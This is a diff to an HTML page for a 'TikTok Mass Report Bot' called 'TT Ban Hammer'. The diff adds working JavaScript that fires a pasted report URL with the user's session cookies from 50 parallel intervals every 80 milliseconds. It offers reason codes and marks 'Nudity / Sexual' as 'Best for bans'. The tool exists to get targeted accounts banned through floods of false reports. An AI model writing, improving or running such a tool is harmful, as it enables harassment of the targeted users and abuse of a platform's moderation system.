@@ -5,24 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TT Ban Hammer</title>
     <style>
-        body { background: black; color: lime; font-family: Arial; padding: 20px; }
-        input, select, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 18px; }
+        body { background: black; color: lime; font-family: Arial; padding: 20px; text-align: center; }
+        input, select, button { width: 90%; padding: 15px; margin: 10px 0; font-size: 18px; }
         button { background: lime; color: black; font-weight: bold; }
-        #log { height: 300px; overflow-y: scroll; background: #111; padding: 10px; }
+        #log { height: 300px; overflow-y: scroll; background: #111; padding: 10px; margin: 10px auto; width: 90%; text-align: left; }
     </style>
 </head>
 <body>
-    <h1>TikTok Mass Report Bot</h1>
+    <h1>🚀 TikTok Mass Report Bot</h1>
     <input type="text" id="url" placeholder="Paste full report link here">
-    <input type="number" id="threads" value="30" placeholder="Threads (30)">
+    <input type="number" id="threads" value="50" placeholder="Threads (50)">
     <select id="reason">
-        <option value="6">Nudity / Sexual</option>
+        <option value="6">Nudity / Sexual (Best for bans)</option>
         <option value="4">Violence</option>
         <option value="3">Harassment</option>
-        <option value="7">Illegal</option>
+        <option value="7">Illegal Activity</option>
     </select>
     <button onclick="start()">START MASS REPORT</button>
     <button onclick="stop()">STOP</button>
     <div id="log"></div>
 
-    <
+    <script>
+        let running = false;
+        let intervals = [];
+        function log(msg) {
+            const logEl = document.getElementById('log');
+            logEl.innerHTML += `<br>${new Date().toLocaleTimeString()} → ${msg}`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+        async function sendReport(url, reason) {
+            try {
+                let fixed = url.includes('reason=') ? url.replace(/reason=\d+/, `reason=${reason}`) : url + (url.includes('?') ? '&' : '?') + `reason=${reason}`;
+                const res = await fetch(fixed, {method: 'GET', credentials: 'include'});
+                if (res.ok) log('✅ Report Sent!');
+                else log('❌ Failed');
+            } catch(e) { log('❌ Error'); }
+        }
+        function start() {
+            if (running) return;
+            running = true;
+            const url = document.getElementById('url').value.trim();
+            const threads = parseInt(document.getElementById('threads').value) || 50;
+            const reason = document.getElementById('reason').value;
+            log('🚀 MASS REPORT ATTACK STARTED');
+            for (let i = 0; i < threads; i++) {
+                const int = setInterval(() => { if(running) sendReport(url, reason); }, 80);
+                intervals.push(int);
+            }
+        }
+        function stop() {
+            running = false;
+            intervals.forEach(i => clearInterval(i));
+            log('🛑 Stopped');
+        }
+    </script>
+</body>
+</html>
